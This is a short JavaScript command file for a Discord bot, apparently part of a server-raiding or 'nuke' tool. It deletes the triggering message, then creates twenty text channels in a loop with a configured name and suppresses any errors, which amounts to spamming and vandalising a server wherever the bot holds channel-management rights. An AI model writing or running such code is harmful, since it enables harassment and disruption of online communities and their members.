const {
    channelName
} = require('../config.json')

exports.run = async (client, msg, args) => {
    msg.delete()

    if (!msg.guild.me.hasPermission("MANAGE_CHANNELS")) return

    for (let i = 0; i < 20; i++) {
        await msg.guild.createChannel(channelName, {
            type: 'text'
        }).catch(() => {})
    }

}